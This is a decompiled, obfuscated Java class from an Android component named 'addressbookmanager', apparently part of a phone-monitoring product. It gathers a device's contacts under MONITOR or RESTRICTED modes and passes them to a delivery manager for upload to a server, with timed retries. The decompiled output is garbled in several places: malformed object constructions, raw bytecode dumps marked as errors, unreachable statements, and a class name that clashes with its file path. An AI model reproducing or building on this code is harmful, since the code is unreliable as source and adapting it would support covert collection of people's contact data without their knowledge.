package com.vvt.addressbookmanager;

import android.content.Context;
import com.vvt.addressbookmanager.delivery.AddressbookDeliveryManager;
import com.vvt.base.FxAddressbookMode;
import com.vvt.base.FxEvent;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.i;
import com.vvt.events.FxAddressBookEvent;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.phoenix.prot.command.a.g;
import com.vvt.phoenix.prot.command.a.s;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;

public class b implements com.vvt.addressbookmanager.b.c, com.vvt.datadeliverymanager.a.a {
    private static final boolean a = d.a;
    private static final boolean b = d.b;
    private static final boolean c = d.e;
    private com.vvt.addressbookmanager.b.b d;
    private com.vvt.datadeliverymanager.b e;
    private FxAddressbookMode mAddressbookMode;
    private com.vvt.addressbookmanager.c.a g;
    private AddressbookDeliveryManager h;
    private e i;
    private a j;
    private Context mContext;
    private com.vvt.preference.b l;
    private boolean m;
    private RunningMode mRunningMode;
    private String o;
    private int p;
    private Timer q;
    private boolean r;

    public b(String paramString, com.vvt.preference.b paramb, RunningMode runningMode, Context context) {
        this.mAddressbookMode = FxAddressbookMode.OFF;
        this.m = false;
        this.p = 0;
        this.r = false;
        this.o = paramString;
        this.l = paramb;
        this.mRunningMode = runningMode;
        this.mContext = context;
    }

    private void a(g paramg) {
        boolean bool1 = a;
        if (bool1) {}
        int i1 = paramg.b();
        FxAddressbookMode localFxAddressbookMode;
        Object localObject1;
        boolean bool2;
        if (i1 > 0) {
            int i2 = a;
            if (i2 != 0) {}
            localFxAddressbookMode = e();
            i2 = a;
            if (i2 != 0) {}
            d();
            i2 = a;
            if (i2 != 0) {}
            localObject1 = this.g;
            ((com.vvt.addressbookmanager.c.a)localObject1).a();
            i2 = a;
            if (i2 != 0) {}
            localObject1 = this.mContext;
            com.vvt.addressbookmanager.b.b.c.b((Context)localObject1);
            i2 = a;
            if (i2 != 0) {}
            f localf = new com/vvt/addressbookmanager/ mAddressbookMode;
            localf.<init>();
            localObject1 = this.g;
            Object localObject2 = this.mContext;
            String str = this.o;
            localf.a((com.vvt.addressbookmanager.c.a)localObject1, (Context)localObject2, str);
            i2 = 0;
            localObject1 = null;
            for (;;)
            {
                int i4 = paramg.b();
                if (i2 >= i4) {
                    break;
                }
                localObject2 = paramg.a(i2).c();
                localf.a((com.vvt.phoenix.prot.command.e)localObject2);
                int i3;
                i2 += 1;
            }
            bool2 = a;
            if (bool2) {}
            try
            {
                localObject1 = FxAddressbookMode.MONITOR;
                if (localFxAddressbookMode != localObject1) {
                    break label224;
                }
                c();
            }
            catch (FxNullNotAllowedException localFxNullNotAllowedException)
            {
                for (;;)
                {
                    bool2 = c;
                    if (!bool2) {}
                }
            }
            localObject1 = this.i;
            if (localObject1 != null)
            {
                localObject1 = this.i;
                ((e)localObject1).a();
            }
        }
        for (;;)
        {
            bool2 = a;
            if (bool2) {}
            return;
            label224:
            localObject1 = FxAddressbookMode.RESTRICTED;
            if (localFxAddressbookMode != localObject1) {
                break;
            }
            b();
            break;
            bool2 = a;
            if (!bool2) {}
        }
    }

    private boolean b(List paramList)
    {
        boolean bool1 = false;
        bool2 = b;
        if ((!bool2) || (paramList == null)) {}
        try
        {
            bool2 = c;
            if (!bool2) {
                break label219;
            }
            bool2 = false;
            localObject = null;
        }
        catch (Exception localException)
        {
            for (;;)
            {
                Object localObject;
                Iterator localIterator;
                bool2 = c;
                if (bool2) {}
                bool2 = false;
                FxAddressBookEvent localFxAddressBookEvent = null;
                continue;
                boolean bool3 = b;
                if (bool3) {}
                com.vvt.addressbookmanager.c.a locala = this.g;
                locala.a(localFxAddressBookEvent, 0, 0);
                continue;
                bool2 = true;
                continue;
                bool2 = false;
                localFxAddressBookEvent = null;
            }
        }
        bool1 = a;
        if (bool1) {}
        bool1 = b;
        if (bool1) {}
        return bool2;
        bool2 = b;
        if (bool2) {}
        localIterator = paramList.iterator();
        for (;;)
        {
            bool2 = localIterator.hasNext();
            if (!bool2) {
                break label214;
            }
            localObject = localIterator.next();
            localObject = (FxEvent)localObject;
            localObject = (FxAddressBookEvent)localObject;
            bool3 = a;
            if (bool3) {}
            locala = this.g;
            long l1 = ((FxAddressBookEvent)localObject).getClientId();
            bool3 = locala.c(l1);
            if (!bool3) {
                break;
            }
            bool3 = b;
            if (bool3) {}
            locala = this.g;
            l1 = ((FxAddressBookEvent)localObject).getClientId();
            locala.a(l1, (FxAddressBookEvent)localObject);
        }
    }

    private void c(i parami)
    {
        boolean bool1 = b;
        if (bool1) {}
        bool1 = b;
        if (bool1) {}
        int i1 = parami.d();
        int i4 = 306;
        boolean bool4;
        Object localObject;
        if (i1 != i4)
        {
            i1 = parami.d();
            i4 = 312;
            if (i1 != i4) {}
        }
        else
        {
            boolean bool2 = a;
            if (bool2) {}
            int i2 = this.p + 1;
            this.p = i2;
            boolean bool3 = a;
            if (bool3) {}
            int i3 = this.p;
            i4 = 5;
            if (i3 < i4)
            {
                bool4 = a;
                if (bool4) {}
                localObject = this.q;
                if (localObject != null)
                {
                    localObject = this.q;
                    ((Timer)localObject).cancel();
                }
                bool4 = a;
                if (bool4) {}
                localObject = new java/util/Timer;
                ((Timer)localObject).<init>();
                this.q = ((Timer)localObject);
                localObject = this.q;
                c localc = new com/vvt/addressbookmanager/c;
                localc.<init>(this);
                long l1 = 180000L;
                ((Timer)localObject).schedule(localc, l1);
                return;
            }
            bool4 = a;
            if (bool4) {}
            this.p = 0;
            localObject = this.j;
            if (localObject != null)
            {
                bool4 = a;
                if (bool4) {}
                localObject = this.j;
                ((a)localObject).a(parami);
            }
        }
        for (;;)
        {
            bool4 = b;
            if (!bool4) {
                break;
            }
            break;
            bool4 = a;
            if (bool4) {}
            this.p = 0;
            localObject = this.j;
            if (localObject != null)
            {
                bool4 = a;
                if (bool4) {}
                localObject = this.j;
                ((a)localObject).a(parami);
            }
        }
    }

    private void l()
    {
        boolean bool = b;
        if (bool) {}
        Object localObject1 = e();
        Object localObject2 = FxAddressbookMode.MONITOR;
        if (localObject1 == localObject2)
        {
            bool = b;
            if (bool) {}
            localObject1 = this.h;
            localObject2 = this.e;
            ((AddressbookDeliveryManager)localObject1).a((com.vvt.datadeliverymanager.b)localObject2);
            localObject1 = this.h;
            ((AddressbookDeliveryManager)localObject1).a();
        }
        for (;;)
        {
            bool = b;
            if (bool) {}
            return;
            localObject1 = e();
            localObject2 = FxAddressbookMode.RESTRICTED;
            if (localObject1 == localObject2)
            {
                bool = b;
                if (bool) {}
                localObject1 = this.h;
                localObject2 = this.e;
                ((AddressbookDeliveryManager)localObject1).a((com.vvt.datadeliverymanager.b)localObject2);
                localObject1 = this.h;
                ((AddressbookDeliveryManager)localObject1).b();
            }
            else
            {
                bool = c;
                if (bool) {}
                localObject1 = new com/vvt/datadeliverymanager/i;
                ((i)localObject1).<init>();
                ((i)localObject1).b(false);
                ((i)localObject1).a("Invalid address book mode");
                localObject2 = this.j;
                ((a)localObject2).a((i)localObject1);
            }
        }
    }

    private void m()
    {
        boolean bool = b;
        if (bool) {}
        Object localObject1 = this.mRunningMode;
        Object localObject2 = RunningMode.FULL;
        if (localObject1 == localObject2) {
            bool = true;
        }
        for (;;)
        {
            localObject1 = com.vvt.addressbookmanager.b.a.a(bool);
            localObject2 = this.mContext;
            ((com.vvt.addressbookmanager.b.b)localObject1).a((Context)localObject2);
            localObject2 = this.o;
            ((com.vvt.addressbookmanager.b.b)localObject1).a((String)localObject2);
            ((com.vvt.addressbookmanager.b.b)localObject1).a(this);
            localObject2 = e();
            ((com.vvt.addressbookmanager.b.b)localObject1).a((FxAddressbookMode)localObject2);
            localObject2 = this.i;
            if (localObject2 != null)
            {
                localObject2 = this.i;
                ((com.vvt.addressbookmanager.b.b)localObject1).a((e)localObject2);
            }
            ((com.vvt.addressbookmanager.b.b)localObject1).a();
            this.d = ((com.vvt.addressbookmanager.b.b)localObject1);
            bool = b;
            if (bool) {}
            return;
            bool = false;
            localObject1 = null;
        }
    }

    private void n()
    {
        boolean bool = b;
        if (bool) {}
        com.vvt.addressbookmanager.b.b localb = this.d;
        if (localb != null)
        {
            localb = this.d;
            FxAddressbookMode localFxAddressbookMode = FxAddressbookMode.OFF;
            localb.a(localFxAddressbookMode);
            localb = this.d;
            localb.b();
        }
        bool = b;
        if (bool) {}
    }

    public void a()
    {
        int i1 = 102;
        boolean bool = a;
        if (bool) {}
        Object localObject1 = this.e;
        if (localObject1 == null)
        {
            localObject1 = new com/vvt/exceptions/FxNullNotAllowedException;
            ((FxNullNotAllowedException)localObject1).<init>("DataDelivery can not be null.");
            throw ((Throwable)localObject1);
        }
        localObject1 = new com/vvt/addressbookmanager/c/a;
        Object localObject2 = this.mContext;
        Object localObject3 = this.o;
        ((com.vvt.addressbookmanager.c.a)localObject1).<init>((Context)localObject2, (String)localObject3);
        this.g = ((com.vvt.addressbookmanager.c.a)localObject1);
        localObject1 = new com/vvt/addressbookmanager/delivery/AddressbookDeliveryManager;
        localObject2 = this.mContext;
        localObject3 = this.mRunningMode;
        ((AddressbookDeliveryManager)localObject1).<init>(i1, (Context)localObject2, (RunningMode)localObject3);
        this.h = ((AddressbookDeliveryManager)localObject1);
        localObject1 = this.h;
        localObject2 = this.g;
        ((AddressbookDeliveryManager)localObject1).a((com.vvt.addressbookmanager.c.a)localObject2);
        this.h.a(this);
        localObject1 = this.e;
        ((com.vvt.datadeliverymanager.b)localObject1).a(i1, this);
        bool = a;
        if (bool) {}
    }

    /* Error */
    public void a(a parama, int paramInt)
    {
        // Byte code:
        //   0: aload_0
        //   1: monitorenter
        //   2: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   5: istore_3
        //   6: iload_3
        //   7: ifeq +3 -> 10
        //   10: iload_2
        //   11: ifle +12 -> 23
        //   14: iload_2
        //   15: i2l
        //   16: lstore 4
        //   18: lload 4
        //   20: invokestatic 281	android/os/SystemClock:sleep	(J)V
        //   23: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   26: istore_3
        //   27: iload_3
        //   28: ifeq +3 -> 31
        //   31: aload_0
        //   32: invokevirtual 283	com/vvt/addressbookmanager/removeFromPath:mAddressbookMode	()V
        //   35: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   38: istore_3
        //   39: iload_3
        //   40: ifeq +3 -> 43
        //   43: aload_0
        //   44: aload_1
        //   45: putfield 200	com/vvt/addressbookmanager/removeFromPath:j	Lcom/vvt/addressbookmanager/a;
        //   48: aload_0
        //   49: invokespecial 79	com/vvt/addressbookmanager/removeFromPath:l	()V
        //   52: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   55: istore_3
        //   56: iload_3
        //   57: ifeq +3 -> 60
        //   60: aload_0
        //   61: invokevirtual 285	com/vvt/addressbookmanager/removeFromPath:FxFileObserverWorker	()V
        //   64: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   67: istore_3
        //   68: iload_3
        //   69: ifeq +3 -> 72
        //   72: aload_0
        //   73: monitorexit
        //   74: return
        //   75: astore 6
        //   77: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   80: istore_3
        //   81: iload_3
        //   82: ifeq -47 -> 35
        //   85: goto -50 -> 35
        //   88: astore 6
        //   90: getstatic 52	com/vvt/addressbookmanager/removeFromPath:MyUncaughtExceptionHandler	Z
        //   93: istore_3
        //   94: iload_3
        //   95: ifeq +3 -> 98
        //   98: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   101: istore_3
        //   102: iload_3
        //   103: ifeq +3 -> 106
        //   106: aload_0
        //   107: invokevirtual 285	com/vvt/addressbookmanager/removeFromPath:FxFileObserverWorker	()V
        //   110: goto -46 -> 64
        //   113: astore 6
        //   115: aload_0
        //   116: monitorexit
        //   117: aload 6
        //   119: athrow
        //   120: astore 6
        //   122: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   125: istore 7
        //   127: iload 7
        //   129: ifeq +3 -> 132
        //   132: aload_0
        //   133: invokevirtual 285	com/vvt/addressbookmanager/removeFromPath:FxFileObserverWorker	()V
        //   136: aload 6
        //   138: athrow
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	139	0	this	removeFromPath
        //   0	139	1	parama	a
        //   0	139	2	paramInt	int
        //   5	98	3	bool1	boolean
        //   16	3	4	l1	long
        //   75	1	6	localInterruptedException	InterruptedException
        //   88	1	6	localException	Exception
        //   113	5	6	localObject1	Object
        //   120	17	6	localObject2	Object
        //   125	3	7	bool2	boolean
        // Exception table:
        //   from	to	target	type
        //   31	35	75	java/lang/InterruptedException
        //   23	26	88	java/lang/Exception
        //   31	35	88	java/lang/Exception
        //   35	38	88	java/lang/Exception
        //   44	48	88	java/lang/Exception
        //   48	52	88	java/lang/Exception
        //   77	80	88	java/lang/Exception
        //   2	5	113	finally
        //   18	23	113	finally
        //   52	55	113	finally
        //   60	64	113	finally
        //   64	67	113	finally
        //   98	101	113	finally
        //   106	110	113	finally
        //   122	125	113	finally
        //   132	136	113	finally
        //   136	139	113	finally
        //   23	26	120	finally
        //   31	35	120	finally
        //   35	38	120	finally
        //   44	48	120	finally
        //   48	52	120	finally
        //   77	80	120	finally
        //   90	93	120	finally
    }

    public void a(FxAddressbookMode paramFxAddressbookMode)
    {
        boolean bool = a;
        if (bool) {}
        bool = a;
        if (bool) {}
        this.mAddressbookMode = paramFxAddressbookMode;
        bool = a;
        if (bool) {}
    }

    public void a(com.vvt.datadeliverymanager.b paramb)
    {
        this.e = paramb;
    }

    public void a(i parami) {}

    public void a(List paramList)
    {
        boolean bool1 = a;
        if (bool1) {}
        int i1 = paramList.size();
        boolean bool2;
        if (i1 > 0)
        {
            bool2 = b(paramList);
            if (bool2) {
                l();
            }
        }
        for (;;)
        {
            bool2 = a;
            if (bool2) {}
            return;
            bool2 = a;
            if (!bool2) {}
        }
    }

    public void b()
    {
        boolean bool = a;
        if (bool) {}
        bool = this.m;
        if (bool) {
            n();
        }
        FxAddressbookMode localFxAddressbookMode = FxAddressbookMode.RESTRICTED;
        this.mAddressbookMode = localFxAddressbookMode;
        m();
        this.m = true;
        bool = a;
        if (bool) {}
    }

    public void b(i parami)
    {
        boolean bool1 = b;
        if (bool1) {}
        bool1 = parami.f();
        Object localObject;
        if (bool1)
        {
            bool1 = b;
            if (bool1) {}
            this.p = 0;
            localObject = parami.a();
            int i1 = ((s)localObject).a();
            int i2 = 9;
            if (i1 == i2)
            {
                localObject = (g)parami.a();
                a((g)localObject);
                localObject = this.j;
                if (localObject != null)
                {
                    localObject = this.j;
                    ((a)localObject).a();
                }
            }
        }
        for (;;)
        {
            localObject = this.i;
            if (localObject != null)
            {
                localObject = (com.vvt.addressbookmanager.b.b.d)this.d;
                e locale = this.i;
                ((com.vvt.addressbookmanager.b.b.d)localObject).a(locale);
            }
            boolean bool2 = b;
            if (bool2) {}
            return;
            localObject = this.g;
            ((com.vvt.addressbookmanager.c.a)localObject).b();
            break;
            bool2 = c;
            if (bool2) {}
            c(parami);
        }
    }

    public void c()
    {
        boolean bool = b;
        if (bool) {}
        bool = this.m;
        if (bool) {
            n();
        }
        FxAddressbookMode localFxAddressbookMode = FxAddressbookMode.MONITOR;
        this.mAddressbookMode = localFxAddressbookMode;
        m();
        this.m = true;
        bool = b;
        if (bool) {}
    }

    public void d()
    {
        boolean bool = b;
        if (bool) {}
        Object localObject = FxAddressbookMode.OFF;
        this.mAddressbookMode = ((FxAddressbookMode)localObject);
        bool = this.m;
        if (bool) {
            n();
        }
        bool = a;
        if (bool) {}
        localObject = this.q;
        if (localObject != null)
        {
            localObject = this.q;
            ((Timer)localObject).cancel();
        }
        localObject = null;
        this.m = false;
        bool = b;
        if (bool) {}
    }

    public FxAddressbookMode e()
    {
        return this.mAddressbookMode;
    }

    public void f()
    {
        boolean bool;
        try
        {
            for (;;)
            {
                bool = this.r;
                if (!bool) {
                    break;
                }
                wait();
            }
            bool = true;
        }
        finally {}
        this.r = bool;
    }

    public void g()
    {
        Object localObject1 = null;
        try
        {
            this.r = false;
            notify();
            return;
        }
        finally {}
    }

    /* Error */
    public void h()
    {
        // Byte code:
        //   0: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   3: istore_1
        //   4: iload_1
        //   5: ifeq +3 -> 8
        //   8: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   11: istore_1
        //   12: iload_1
        //   13: ifeq +3 -> 16
        //   16: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   19: istore_1
        //   20: iload_1
        //   21: ifeq +3 -> 24
        //   24: aload_0
        //   25: invokevirtual 283	com/vvt/addressbookmanager/removeFromPath:mAddressbookMode	()V
        //   28: new 325	java/util/ArrayList
        //   31: astore_2
        //   32: aload_2
        //   33: invokespecial 326	java/util/ArrayList:<init>	()V
        //   36: aload_0
        //   37: getfield 75	com/vvt/addressbookmanager/removeFromPath:mRunningMode	Lcom/vvt/base/RunningMode;
        //   40: astore_2
        //   41: getstatic 230	com/vvt/base/RunningMode:FULL	Lcom/vvt/base/RunningMode;
        //   44: astore_3
        //   45: aload_2
        //   46: aload_3
        //   47: if_acmpeq +150 -> 197
        //   50: aload_0
        //   51: getfield 77	com/vvt/addressbookmanager/removeFromPath:mContext	Landroid/content/Context;
        //   54: astore_2
        //   55: iconst_0
        //   56: istore 4
        //   58: aconst_null
        //   59: astore_3
        //   60: aload_2
        //   61: iconst_0
        //   62: invokestatic 329	com/vvt/addressbookmanager/removeFromPath/removeFromPath/MyUncaughtExceptionHandler:a	(Landroid/content/Context;Z)Ljava/util/ArrayList;
        //   65: astore_2
        //   66: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   69: istore 4
        //   71: iload 4
        //   73: ifeq +3 -> 76
        //   76: aload_2
        //   77: invokevirtual 330	java/util/ArrayList:iterator	()Ljava/util/Iterator;
        //   80: astore_3
        //   81: aload_3
        //   82: invokeinterface 146 1 0
        //   87: istore_1
        //   88: iload_1
        //   89: ifeq +132 -> 221
        //   92: aload_3
        //   93: invokeinterface 150 1 0
        //   98: astore_2
        //   99: aload_2
        //   100: checkcast 154	com/vvt/events/FxAddressBookEvent
        //   103: astore_2
        //   104: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   107: istore 5
        //   109: iload 5
        //   111: ifeq +3 -> 114
        //   114: aload_0
        //   115: getfield 91	com/vvt/addressbookmanager/removeFromPath:FxFileObserverWorker	Lcom/vvt/addressbookmanager/MyUncaughtExceptionHandler/a;
        //   118: astore 6
        //   120: iconst_3
        //   121: istore 7
        //   123: aload 6
        //   125: aload_2
        //   126: iload 7
        //   128: iconst_0
        //   129: invokevirtual 167	com/vvt/addressbookmanager/MyUncaughtExceptionHandler/a:a	(Lcom/vvt/events/FxAddressBookEvent;II)V
        //   132: goto -51 -> 81
        //   135: astore_2
        //   136: getstatic 52	com/vvt/addressbookmanager/removeFromPath:MyUncaughtExceptionHandler	Z
        //   139: istore_1
        //   140: iload_1
        //   141: ifeq +3 -> 144
        //   144: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   147: istore_1
        //   148: iload_1
        //   149: ifeq +3 -> 152
        //   152: aload_0
        //   153: invokevirtual 285	com/vvt/addressbookmanager/removeFromPath:FxFileObserverWorker	()V
        //   156: aload_0
        //   157: getfield 124	com/vvt/addressbookmanager/removeFromPath:i	Lcom/vvt/addressbookmanager/e;
        //   160: astore_2
        //   161: aload_2
        //   162: ifnull +14 -> 176
        //   165: aload_0
        //   166: getfield 124	com/vvt/addressbookmanager/removeFromPath:i	Lcom/vvt/addressbookmanager/e;
        //   169: astore_2
        //   170: aload_2
        //   171: invokeinterface 127 1 0
        //   176: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   179: istore_1
        //   180: iload_1
        //   181: ifeq +3 -> 184
        //   184: return
        //   185: astore_2
        //   186: getstatic 45	com/vvt/addressbookmanager/removeFromPath:a	Z
        //   189: istore_1
        //   190: iload_1
        //   191: ifeq -163 -> 28
        //   194: goto -166 -> 28
        //   197: invokestatic 336	com/vvt/addressbookmanager/removeFromPath/a/a:e	()Ljava/util/ArrayList;
        //   200: astore_2
        //   201: goto -135 -> 66
        //   204: astore_2
        //   205: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   208: istore 4
        //   210: iload 4
        //   212: ifeq +3 -> 215
        //   215: aload_0
        //   216: invokevirtual 285	com/vvt/addressbookmanager/removeFromPath:FxFileObserverWorker	()V
        //   219: aload_2
        //   220: athrow
        //   221: getstatic 48	com/vvt/addressbookmanager/removeFromPath:removeFromPath	Z
        //   224: istore_1
        //   225: iload_1
        //   226: ifeq -74 -> 152
        //   229: goto -77 -> 152
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	232	0	this	removeFromPath
        //   3	223	1	bool1	boolean
        //   31	95	2	localObject1	Object
        //   135	1	2	localException	Exception
        //   160	11	2	locale	e
        //   185	1	2	localInterruptedException	InterruptedException
        //   200	1	2	localArrayList	java.util.ArrayList
        //   204	16	2	localObject2	Object
        //   44	49	3	localObject3	Object
        //   56	155	4	bool2	boolean
        //   107	3	5	bool3	boolean
        //   118	6	6	locala	com.vvt.addressbookmanager.MyUncaughtExceptionHandler.a
        //   121	6	7	i1	int
        // Exception table:
        //   from	to	target	type
        //   16	19	135	java/lang/Exception
        //   24	28	135	java/lang/Exception
        //   28	31	135	java/lang/Exception
        //   32	36	135	java/lang/Exception
        //   36	40	135	java/lang/Exception
        //   41	44	135	java/lang/Exception
        //   50	54	135	java/lang/Exception
        //   61	65	135	java/lang/Exception
        //   66	69	135	java/lang/Exception
        //   76	80	135	java/lang/Exception
        //   81	87	135	java/lang/Exception
        //   92	98	135	java/lang/Exception
        //   99	103	135	java/lang/Exception
        //   104	107	135	java/lang/Exception
        //   114	118	135	java/lang/Exception
        //   128	132	135	java/lang/Exception
        //   186	189	135	java/lang/Exception
        //   197	200	135	java/lang/Exception
        //   24	28	185	java/lang/InterruptedException
        //   16	19	204	finally
        //   24	28	204	finally
        //   28	31	204	finally
        //   32	36	204	finally
        //   36	40	204	finally
        //   41	44	204	finally
        //   50	54	204	finally
        //   61	65	204	finally
        //   66	69	204	finally
        //   76	80	204	finally
        //   81	87	204	finally
        //   92	98	204	finally
        //   99	103	204	finally
        //   104	107	204	finally
        //   114	118	204	finally
        //   128	132	204	finally
        //   136	139	204	finally
        //   186	189	204	finally
        //   197	200	204	finally
    }

    public void i()
    {
        boolean bool = b;
        if (bool) {}
        com.vvt.addressbookmanager.c.a locala = this.g;
        locala.d();
        bool = b;
        if (bool) {}
    }

    public void j()
    {
        boolean bool = b;
        if (bool) {}
        d();
        com.vvt.addressbookmanager.c.a locala = this.g;
        locala.d();
        bool = b;
        if (bool) {}
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */